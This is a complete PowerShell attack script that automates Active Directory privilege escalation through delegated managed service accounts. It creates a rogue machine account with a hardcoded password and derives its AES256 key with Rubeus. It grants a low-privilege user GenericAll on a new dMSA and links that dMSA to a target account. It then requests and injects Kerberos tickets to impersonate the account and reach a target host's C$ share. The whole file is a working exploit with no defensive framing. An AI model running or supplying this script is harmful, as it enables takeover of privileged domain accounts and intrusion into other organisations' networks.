param (
    [string]$Domain,
    [string]$OU,
    [string]$LinkTargetDN,
    [string]$LowPrivUser,
    [string]$TargetHost
)

# Auto-generate DMSA name
$DMSAName = "BadDMSA$((Get-Random -Minimum 1000 -Maximum 9999))"
Write-Host "`n[*] Generated dMSA name: $DMSAName" -ForegroundColor Green

$ouPath = "OU=$OU,DC=$($Domain -replace '\.', ',DC=')"
$dmsaDN = "CN=$DMSAName,$ouPath"

### 1. Create computer account
$ComputerName = "BadMachine" + (Get-Random -Minimum 1000 -Maximum 9999)
$ComputerPassword = "Passw0rd@123456"
$ComputerFQDN = "$ComputerName.$Domain"

Write-Host "`n[*] Creating machine account '$ComputerName' with password: $ComputerPassword" -ForegroundColor Green

New-ADComputer -Name $ComputerName `
    -SamAccountName "$ComputerName`$" `
    -AccountPassword (ConvertTo-SecureString -String $ComputerPassword -AsPlainText -Force) `
    -Enabled $true `
    -Path $ouPath `
    -PassThru `
    -Server $Domain

Read-Host "`n[+] Computer account '$ComputerName' created. Press ENTER to derive AES256 key..."

### 2. Derive AES256 hash via Rubeus
$RubeusPath = "Rubeus.exe"
$hashCmd = "$RubeusPath hash /password:$ComputerPassword /user:$ComputerName`$ /domain:$Domain"
Write-Host "[*] Running to derive AES256 hash:" -ForegroundColor Green
Write-Host "    $hashCmd" -ForegroundColor Green
$rubeusOutput = Invoke-Expression $hashCmd

# Parse AES256 hash
$AES256 = $null
foreach ($line in $rubeusOutput) {
    if ($line -match "aes256_cts_hmac_sha1\s*:\s*([a-fA-F0-9]{64})") {
        $AES256 = $matches[1]
        break
    }
}

if ($AES256) {
    Write-Host "[+] AES256 hash derived: $AES256" -ForegroundColor Green
} else {
    Write-Error "[-] Failed to derive AES256 hash from Rubeus output."
}

Read-Host "Press ENTER to create dMSA..."

### 3. Create dMSA
try {
    Write-Host "`n[*] Creating dMSA account..." -ForegroundColor Green
    New-ADServiceAccount -Name $DMSAName `
        -DNSHostName "$DMSAName.$Domain" `
        -CreateDelegatedServiceAccount `
        -KerberosEncryptionType AES256 `
        -PrincipalsAllowedToRetrieveManagedPassword "$ComputerName`$" `
        -Path $ouPath `
        -Verbose -ErrorAction Stop
    Read-Host "[+] dMSA created. Press ENTER..."
}
catch {
    Write-Error "[-] Failed to create dMSA account:"
    $_ | Format-List * -Force
    return
}

### 4. Grant GenericAll on dMSA to LowPrivUser
try {
    Write-Host "`n[*] Granting GenericAll to $LowPrivUser on $dmsaDN..." -ForegroundColor Green
    $sid = (Get-ADUser -Identity ($LowPrivUser.Split("\\")[-1])).SID
    $acl = Get-Acl "AD:\$dmsaDN" -ErrorAction Stop
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\$dmsaDN" -AclObject $acl -ErrorAction Stop
    Write-Host "[+] Permission granted." -ForegroundColor Green
    Read-Host "`n[+] ACL updated. Press ENTER to continue..."
}
catch {
    Write-Error "[-] Failed to apply ACL:"
    $_ | Format-List * -Force
    return
}

### 5. Set delegation attributes
try {
    Write-Host "`n[*] Setting Delegation values..." -ForegroundColor Green
    Set-ADServiceAccount -Identity $DMSAName -Replace @{
        'msDS-ManagedAccountPrecededByLink' = $LinkTargetDN
        'msDS-DelegatedMSAState' = 2
    } -Verbose -ErrorAction Stop
    Read-Host "[+] Delegation values set. Press ENTER..."
}
catch {
    Write-Error "[-] Failed to set delegation fields:"
    $_ | Format-List * -Force
    return
}

### 6. Confirm dMSA
Write-Host "`n[*] Confirming dMSA attributes..." -ForegroundColor Green
Get-ADServiceAccount -Identity $DMSAName -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState |
    Select-Object Name, msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState
Read-Host "`n[+] Confirmed. Press ENTER to test access..."

### 7. Pre-impersonation access test
Write-Host "`n[*] Testing access BEFORE impersonation..." -ForegroundColor Green
$preCheck = "dir \\$TargetHost\c$"
Write-Host "[>] $preCheck" -ForegroundColor Green
Invoke-Expression $preCheck
Read-Host "`n[+] Pre-access complete. Press ENTER to request TGT..."

### 8. Request TGT with machine account
$tgtCmd = "Rubeus.exe asktgt /user:$ComputerName`$ /aes256:$AES256 /domain:$Domain /nowrap"
Write-Host "`n[*] Requesting TGT..." -ForegroundColor Green
Write-Host "[>] $tgtCmd" -ForegroundColor Green
$tgtOutput = Invoke-Expression $tgtCmd
Read-Host "`n[+] TGT requested. Press ENTER to extract ticket..."

### 9. Extract base64 ticket
$base64TGT = ($tgtOutput | Select-String -Pattern 'doIF[\w+/=]+').Matches.Value
if (-not $base64TGT) {
    Write-Error "[-] Failed to extract base64 TGT ticket."
    return
}
Write-Host "[+] Extracted base64 TGT ticket." -ForegroundColor Green
Read-Host "Press ENTER to request TGS..."

### 10. Request TGS impersonating dMSA
$tgsCmd = "Rubeus.exe asktgs /targetuser:$DMSAName`$ /service:krbtgt/$Domain /dmsa /ticket:$base64TGT /opsec /ptt /nowrap"
Write-Host "`n[*] Requesting TGS..." -ForegroundColor Green
Write-Host "[>] $tgsCmd" -ForegroundColor Green
$tgsOutput = Invoke-Expression $tgsCmd
Read-Host "`n[+] TGS complete. Press ENTER to test access..."

### 11. Post-impersonation access test
Write-Host "`n[*] Testing access AFTER impersonation..." -ForegroundColor Green
$postCheck = "dir \\$TargetHost\c$"
Write-Host "[>] $postCheck" -ForegroundColor Green
Invoke-Expression $postCheck
Read-Host "`n[+] Script complete. Press ENTER to exit and run any post exploitation Tool."
